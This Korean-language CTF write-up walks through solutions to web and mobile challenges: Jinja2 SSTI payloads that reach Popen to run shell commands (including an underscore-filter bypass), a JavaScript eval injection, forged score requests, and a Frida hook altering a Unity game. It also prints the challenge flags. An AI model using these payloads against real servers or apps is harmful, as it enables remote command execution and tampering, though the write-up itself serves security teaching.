---
title: "HSPACE CTF THE ZERO Write-up"

categories:
  - writeup
tags: [web, pwnable, reversing, writeup]

---


## [WEB] So Special ThIngs

문제 제목에서도 알 수 있듯이 SSTI(Server Side Template Injection) 문제 입니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled.png)

처음 문제 페이지에 접속하면 `{% raw %}{{7*7}}{% endraw %}` 이라는 내용을 봐도 SSTI 인것을 예상할 수 있습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%201.png)

간단하게 내용을 작성해 본 후 Send Message 를 누르면 잘 전송되었다는 메시지만 보입니다.

fiddler와 같은 프록시툴을 사용해보면 응답 값을 확인할 수 있습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%202.png)

**level1**

---

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%203.png)

"just execute flag function" 라는 문구를 볼 수 있습니다.

```jsx
<h1>NoNo... [_]</h1><h3>filter list [ config, os, open, self, _, ", ., request, [, ], join, % ]</h3>
```

아마 상당히 빡센 필터링을 보고 많은 분들이 너무 어렵게 생각하셨을 지도 모르겠지만, 생각보다 간단히 풀이할 수 있는 문제였습니다!!

먼저 그냥 flag만 써봅니다

```jsx
[Request]
{% raw %}{{flag}}{% endraw %}
```

```jsx
[Reponse]
lv1 = (<function read_flag at 0x7fc2d1f11040>)
```

실행시켜봅니다!

```jsx
{% raw %}{{flag()}}{% endraw %}
```

```jsx
lv1 = ([lv2] https://1f07690201acafa9871483b5a81e1353.imreplay.com/
server2: https://7f788d25dc617ebb50b38460d81089ef4b2ae1baa.imreplay.com)
```

**level2**

---

level1 보다 필터링이 느슨하지만 flag() 함수는 없습니다.

```jsx
filter list [ "config", "items", "os", "%" ]
```

```python
[Request]
{% raw %}{{"".__class__}}{% endraw %}

[Response]
lv2 = (<class 'str'>)
```

```python
[Request]
{% raw %}{{"".__class__.__base__}}{% endraw %}

[Response]
lv2 = (<class 'object'>)
```

```python
[Request]
{% raw %}{{"".__class__.__base__.__subclasses__()}}{% endraw %}

[Response]
lv2 = ([<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>
...
...
...
<class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>])
```

여기서 쭈-욱 보다 보면 Popen을 찾을 수 있습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%204.png)

```python
[Request]
{% raw %}{{().__class__.__base__.__subclasses__()[233]('ls',shell=True,stdout=-1).communicate()[0].strip()}}{% endraw %}

[Response]
lv2 = (b'Dockerfile\napp.py\nflag.txt\nstatic\ntemplates')
```

```python
[Request]
{% raw %}{{().__class__.__base__.__subclasses__()[233]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}{% endraw %}

[Response]
lv2 = (b'level3 -> https://d9063b8995859d9226027f66f0d7b2b0.imreplay.com/
server2(lv3) -> https://d69d3706249a30f0ef365b8b5887e5481eb64242.imreplay.com/')
```

level3

---

필터링이 생각보다 많이 걸려있는 문제입니다. 적용된 필터링 키워드는 다음과 같습니다.

```python
filtering = ["config","os","open","finalflag","decode","self","_",'"',".","request","[","]","join","%"]
```

문제의 출제 의도는 `_` 문자 필터링을 jinja2 템플릿 문법을 사용하여 우회할 수 있는지에 대한 문제였습니다.

[](https://jinja.palletsprojects.com/en/2.10.x/templates/#attr)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%205.png)

해당 문제는 jinja 템플릿에서 사용할 수 있는 Builtin Filters 중 attr() 필터를 사용하여 풀이할 수 있습니다.

_ 대신 '\x5f'를 사용한 후 attr() 필터를 적용하면

`().__class__` 를`()|attr('\x5f\x5fclass\x5f\x5f')` 와 같이 사용할 수 있습니다.

이후부터는 level2와 동일한 방법으로 접근하여 풀이할 수 있습니다.

```python
[Request]
{% raw %}{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}{% endraw %}

[Response]
lv3 = ([<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_reverseitemiterator'>
...
```

```python
[Request]
{% raw %}{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(233)('cat final*',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)}}{% endraw %}

[Response]
lv3 = (b'hspace{g00d_go0d_s3rver_S1de_Temp14te_InJection!!}\n')
```

끝!

FLAG: hspace{g00d_go0d_s3rver_S1de_Temp14te_InJection!!}

**Ref.**

[https://docs.python.org/3/library/stdtypes.html#class.__bases__](https://docs.python.org/3/library/stdtypes.html#class.__bases__)

[https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)

[https://jinja.palletsprojects.com/en/2.10.x/templates/#attr](https://jinja.palletsprojects.com/en/2.10.x/templates/#attr)

## [WEB] Crazy_Sonic

풀이 1: 무적핵 + 스피드핵을 통하여 플래그 획득

풀이 2: 자바스크립트 로직과 이상 탐지 응답값을 비교하여 토큰값과 점수를 서버에 전송하여 플래그 획득

문제 출제 의도: 자바스크립트 로직 분석과 서버단 백엔드의 이상탐지 우회를 목적으로 출제

풀이 3: 그냥 달려서 깬다. 

1. 에피소드

문제 에피소드: 2020년 2020 BoB 9기 CTF 당시 "**Fun Fun Game**"(라온 펀펀 모티브)이라는 웹 문제로 게임을 출제 했을 당시 괜찮다고 해서 이번에도 비슷한 방식으로 게임을 출제함. ([https://core-research-team.github.io/2020-09-01/2020-BoB-CTF-Write-up-2#48ebbbc5-61a9-4180-a3cf-84bb289d683a](https://core-research-team.github.io/2020-09-01/2020-BoB-CTF-Write-up-2#48ebbbc5-61a9-4180-a3cf-84bb289d683a))

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Attack.gif)

+ 원래는 위 그림처럼 진행하려고 했으나, 그 당시 문제 풀이법을 몰라도 오기로 깰 수 있도록 게임 난이도를 적당하게 조절해달라는 피드백이 요청들어와 반영함.

- 게임 기반

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%206.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%207.png)

인터넷 연결이 안될 때 Chrome 브라우저의 게임 기능중 Chrome://dino 컨셉으로 "**t-rex-runner**" 오픈 소스를 기반으로 게임을 제작하게 됨.

2. 이스터 에그 

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%208.png)

- 문제 완성후 출제하기전, 베타 테스트로 주변 분들이 이스터에그를 많이 찾아주셨습니다. (소닉 테마 만드신분이 넣으신것 같습니다.)

3. 문제 풀이

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%209.png)

3-1. 기본적으로 "스페이스"바를 눌러 게임이 시작되면 소닉이 힘차게 달립니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2010.png)

3-2. 시작과 동시에 "check.php" 페이지에 토큰에 시작을 알리는 "start"와 점수 score에는 "0"으로 POST로 전송되는걸 볼 수 있습니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2011.png)

3-3. 정상적인 값이 전송되었을 때 서버측에서는 위 그림와 같이 다음 토큰에 사용될 Random Hash를 반환합니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2012.png)

3-4. 하지만 시조새에 들이 박아 게임 오버가 되며 클라이언트는 게임오버를 알리는 패킷을 전송합니다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2013.png)

3-5. 게임 시작을 알리는 부분과 같은 방식으로 점수를 "0"과 함께 토큰 또한 초기화를 알리는 "start"를 전송하게 됩니다.

- 게임오버 함수 찾기

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2014.png)

3-6.  "gameOver" 함수에서는 서버측으로 전송하는 기능이 없으며, 단순히 클라이언트 단에서 게임을 종료하는 로직만 존재.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2015.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2016.png)

3-7. 다른 "gameOver" 로직을 살펴보면 총 3개가 존재하는걸 알 수 있다. "1020","1024"번째 줄에 존재하는 게임오버 함수는 "reg", "reg2" 변수에 존재하는 정규표현식에 의해 작동이 되고나서 게임이 종료된다. 해당 정규표현식을 살펴보면 플래그 출력되는 플래그 양식과 무언가 경고를 출력하는 alert 문구가 있는걸 보니 정답이거나 비정상일 경우 출력되는 부분으로 파악할 수 있다.

하지만 "574" 번째 줄의 함수는 실제로 게임이 오버되기전 먼저 "573"번째 줄 함수가 실행되어 패킷을 전송하고 게임 오버가 되는걸 볼 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2017.png)

3-8. 게임 시작 또는 초기화시 전송되는 시작/리셋 함수

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2018.png)

3-9. 위 콘솔로 현재 점수도 파악할 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2019.png)

3-10. 게임이 오버가 되어도 서버측에 리셋 패킷을 보내지 않도록 주석 처리

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2020.png)

3-11.  "**Runner.prototype.gameOver = function (){}**" 함수 오버라이딩(재정의)을 통하여 게임 오버시 클라이언트단에서도 아무런 동작을 하지 않도록 수정하며, "**Runner.instance_.setSpeed(55)**" 적절하게 스피드를 조절한다. 

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/8.54.02.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/8.54.10.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/8.54.26.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/8.54.32.png)

아래는 프록시 패킷으로 본 장면

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2021.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2022.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2023.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2024.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2025.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/8.56.07.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/8.56.20.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2026.png)

변수 "ACHIEVEMENT_DISTANCE" 거리 만큼 서버에 전송하는걸 알 수 있으며,

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2027.png)

해당 로직을 통하여 브라우저에 점수 출력과 함께 체크를 주기적으로 보내는걸 알 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2028.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2029.png)

하지만 속도 조절을 잘못하거나, 점수 조작시 위와 같은 화면이 출력되면서 서버측에서 이상탐지로 기존 점수를 초기화후 재시작을 한다.

```jsx
$.ajaxSetup({async: false});  

var url = "check.php";
var data = {score: 0, token: "start"};
token = 0;

$.post(url, data, function(response) {
    token = response;
    
});

score = 0;
score_p = 2500;

for(var i = 0;  i < 4;  i++) {
    score += score_p;
    
    if (i == 3 ) {
        var data = {score: 10000, token: token, clear:"clear"};
		$.post(url, data, function(response) {
            flag = response;
            console.log(flag);
        });
    } else {
        var data = {score: score, token: token};
        $.post(url, data, function(response) {
            token = response;
        });
    }

};
```

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Apr-27-2021_10-26-15.gif)

FLAG: hspace{!Angry_Sn0ic_@RunRUN}

## [WEB] Dino Wallet

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_1.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_2.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_3.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_4.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_5.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_6.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_7.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_8.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_9.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_10.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_11.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_12.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Dino_Wallet_13.png)

FLAG: hspace{Async_1s_n0t_4sync}

## [WEB] IF YOU WANT

```jsx
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const FLAG = "hspace{If_you_want,_you'll_find_a_way:D ahahaha~~}";

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended: false }));

app.get('/', (req, res) => {
    res.send(`
        <form action="/" method="post">
            <table>
                <tr>
                    <td>code</td>
                    <td><input type="text" name="code"></td>
                    <td>
                    <input type="submit" value="submit">
                    </td>
                </tr>
            </table>
        </form>
    `)
});

app.post('/', (req, res) => {
    const blacklist = ['(','/']
    if (req.body.code.length > 11){
        return res.send('request too long');
    } 
    let filtered = blacklist
    try{
        filtered = blacklist.filter(x => !req.body.code.toString().includes(x));

        if (JSON.stringify(filtered) != JSON.stringify(blacklist)){
            return res.send('blocked');
        }
        const code = `(()=>console.log("${req.body.code}"))()`;
        return res.send('>> '+eval(code)+'<br>Is it what you want?:D');
    } catch (err) {
        return res.send('invalid code');
    }
});

app.listen(80, () => console.log('Server On 80'));
```

파라미터명이 같은 파라미터를 두 개 전송하게 되면 javascript에서는 이를 array로 인식하게 됩니다. 따라서 req.body.code.length 제한을 우회할 수 있습니다.

첫번째 방법은 파라미터 전송시 함수를 닫고 FLAG를 출력하는 방식으로 문제를 해결할 수 있습니다. `code="));FLAG<!--&code=b`

두번째 방법은 Content-Type을 application/json으로 변경 후 `{"code":["\\"));FLAG<!—"]}` 값을 전송하여 문제를 풀 수 있습니다.

FLAG: hspace{If_you_want,_you'll_find_a_way:D ahahaha~~}

## [MOBILE] Adventure of Warrior

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2030.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2031.png)

---

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2032.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2033.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Screenshot_20210426-103708.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2034.png)

---

---

**[모든 솔버들의 풀이]**

`Jsec`님의 Write Up

1. 캐릭터와 보스가 충분히 가까워 진다면 보스는 공격 모션을 취한다.
하지만 **보스의 리치는 굉장히 짧기 때문에** 그 타이밍에 **안전하게 5대를 때릴 수 있게** 된다.
2. **그 이후 백스텝을 밞으며 거리 유지**를 하다가 보스가 공격 모션을 보일때 마다 5대를 때리고 도망가고
3. **도망을 가는 도중 공격 키를 누른뒤 공격이 닿기 직전 보스가 있는 곳을 한 번 봐주면** 얄밉게 한 대를 때릴 수 있게된다.
4.  `2, 3번째 방법`을 이용하면 금방 보스가 죽는다.

---

**[내가 원했던 풀이 방법]**

- 출제 의도

```python
Unity il2cpp로 Build된 Android Game App을 분석할 수 있는가??
```

**[Unity Engine]**

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Screenshot_20210426-104426.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2035.png)

**[Unity의 Android Game Build의 2가지 방식 - 1. Mono 방식]**

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2036.png)

---

**[Unity의 Android Game Build의 2가지 방식 - 2. il2cpp 방식]**

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2037.png)

---

- APK Structure

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2038.png)

- [libil2cpp.so](http://libil2cpp.so)  분석

    ![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2039.png)

    ![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2040.png)

- [libil2cpp.so](http://libil2cpp.so)의 symbol

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2041.png)

---

---

**[il2cppdumper - Symbol 복구]**

- version 6.5.3
- Run `Il2CppDumper.exe` and choose the il2cpp executable file and `global-metadata.dat` file, then enter the information as prompted
The program will then generate all the output files in current working directory

**Command-line**

```
Il2CppDumper.exe <executable-file> <global-metadata> <output-directory>
```

**global-metadata.dat 파일 위치**

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2042.png)

**il2cppdumper.exe 실행**

```python
$ Il2CppDumper.exe **libil2cpp.so** **global-metadata.dat** ./
```

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2043.png)

**/DummyDll/Assembly-CSharp.dll** 과 dump.cs 파일 등이 생김 

---

---

**[Dnspy]**

dnSpy is a debugger and .NET assembly editor. You can use it to edit and debug assemblies even if you don't have any source code available. Main features:

- Debug .NET and Unity assemblies
- Edit .NET and Unity assemblies
- Light and dark themes

---

**[Assembly-CSharp.dll 디컴파일]**

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2044.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2045.png)

**void SetHp(int _Hp) -  RVA(Relative Virtual Address) → "0x590E44"**

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2046.png)

---

**[Frida를 이용한 함수 후킹]**

```jsx
Java.perform(function(){

    var library_name = "libil2cpp.so"
    var library_loaded = 0
    Interceptor.attach(Module.findExportByName(null, "dlopen"),{
        onEnter: function(args){
            var library_path = Memory.readCString(args[0])
            console.log("load Library    " + library_path);
 
            if( library_path.includes(library_name)){
                console.log("[...] Loading library : " + library_path)
                library_loaded = 1
            }
        },
        onLeave: function(args){
            if(library_loaded ==  1){         // 원하는 library가 로딩되었을때
                console.log("[+] Loaded")
                
                var base_address = Module.getBaseAddress('libil2cpp.so');
                console.log("Base Address is     " + base_address);

                var Update_address = base_address.add(0x590F9C);
                var Sword_SetHp_address = base_address.add(0x590F04); 
								var Sword_SetAttackDmg_address = base_address.add(0x59105C);                

								var Sword_SetHpCall = new NativeFunction(Sword_SetHp_address, 'void', ['pointer', 'uint32']);
								var Sword_SeAttackDmgCall = new NativeFunction(Sword_SetAttackDmg_address, 'void', ['pointer', 'uint32']);

// Method Hooking!
                Interceptor.attach(Update_address,{
                    onEnter:function(args){
                        console.log("Method Name[onEnter] : void Update()");
                        Sword_SetHpCall(args[0], 10000);          // 체력을 1만으로
												Sword_SeAttackDmgCall(args[0], 10000);    // 공격력을 1만으로
                    },
                    onLeave:function(args){
                        console.log("Method Name[onLeave] : void Update()");
                        
                    }
                });
								library_loaded = 0
            }
        }
    })
});
```

**[실행 화면]**

[HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/output(crop-video.com).mp4](HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/output(crop-video.com).mp4)

---

(**[Error) 에뮬레이터 환경에서의 [libil2cpp.so](http://libil2cpp.so)  Memory Load 문제]**

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2047.png)

Frida 실행 후 `Module.findBaseAddress("libil2cpp.so")`를 해보면  주소를 찾을 수 없다.

하지만 실제 프로세스 map을 보면, [libil2cpp.so](http://libil2cpp.so)를 로드하는 것을 확인할 수 있다.

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/Untitled%2048.png)

Frida에서  libil2cpp.so를 찾지 못하는 이유는, 에뮬레이터 환경(Nox, LDPlayer 등)에서는 x86 기반으로 동작하기 때문에 arm로 컴파일된 so 파일을 로드하기 위해서는 `"libhoudini.so"` 을 이용하여 에뮬레이팅한다고 한다. 

```python
[SM-G955N::com.hspace.raonwhitehat.WarriorAdventure]-> Module.findBaseAddress('libhoudini.so')
"0xbc1ba000"
```

그래서 Frida로 `Module.findBaseAddress("libhoudini.so")` 해보면, BaseAddress 주소를 확인할 수 있다. 결론은... 에뮬로 [`libil2cpp.so`](http://libil2cpp.so)를 후킹하기 하기 어려움...  실 기기에서 후킹을 진행하자!..

FLAG: hspace{warrior_is_very_strong}

## [MOBILE] Pengsu Wallet

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_1.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_2.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_3.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_4.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_5.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_6.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_7.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_8.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_9.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_10.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_11.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_12.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_13.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_14.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_15.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_16.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_17.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_18.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_19.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_20.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_21.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_22.png)

![](/assets/post/HSPACE%20CTF%20THE%20ZERO%20Write-up%2091ac8e6fcfa64ea3ba4259919f19470e/PengsuWriteup_23.png)

